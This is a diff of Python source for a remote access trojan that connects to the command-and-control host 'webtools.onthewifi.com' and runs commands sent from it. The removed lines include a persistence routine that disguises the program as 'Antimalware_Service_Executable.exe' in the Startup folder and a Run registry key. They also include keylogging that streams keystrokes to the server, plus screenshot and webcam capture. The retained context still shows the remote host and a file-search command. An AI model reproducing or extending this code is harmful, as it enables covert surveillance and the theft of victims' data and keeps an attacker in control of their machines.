@@ -1,42 +1,9 @@
-import glob
 import socket
 import subprocess
 import os
 import getpass
 import time
 import re
-import sys
-import keyboard
-import shutil
-from threading import Thread
-from tkinter import messagebox
-import cv2
-import pyautogui
-
-"""
-try:
-    pfilename = str(os.path.basename(sys.executable))
-    username = os.getenv('username')
-    fp = '"C:\\Users\\' + username + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
-    fp2 = '"C:\\Users\\' + username + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
-    fp3 = 'C:\\Users\\' + username + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
-
-    filename = '"Antimalware_Service_Executable.exe"'
-    cfilename = 'Antimalware_Service_Executable.exe'
-    cmd = 'xcopy ' + filename + ' ' + '"' + fp + '"'
-    cmd2 = 'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WinDef /t REG_SZ /d "C:\\Users\\' + username + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\antimalware_service_executable.exe"'
-
-    shell = subprocess.Popen(cmd2,stdout=subprocess.PIPE)
-    
-except:
-    pass
-
-try:
-    ocd = shutil.copyfile(str(pfilename), str(fp3 + cfilename))
-except:
-    pass
-
-"""
 
 HEADER = 50
 HOST = 'webtools.onthewifi.com'
@@ -159,33 +126,6 @@ while True:
                 td = st()
                 s.send(str.encode(td))
 
-            elif cmd.lower() == "keylog":
-                while True:
-                    keyp = keyboard.read_key()
-                    s.send(str.encode(keyp))
-            
-            elif cmd.lower() == "screencapture":
-                myScreenshot = pyautogui.screenshot()
-                myScreenshot.save("lk.png")
-            
-            elif cmd.lower() == "webcapture":
-                cam = cv2.VideoCapture(0)
-
-                img_counter = 0
-
-                for i in range(10):
-                    ret, frame = cam.read()
-                    if not ret:
-                        print("failed to grab frame")
-                        break
-
-                    img_name = "vk{}.png".format(img_counter)
-                    cv2.imwrite(img_name, frame)
-                    print("{} written!".format(img_name))
-                    img_counter += 1
-
-                cam.release()
-            
             elif cmd.lower().startswith("findx"):
                 filetype = cmd.replace("findx ", "")
 
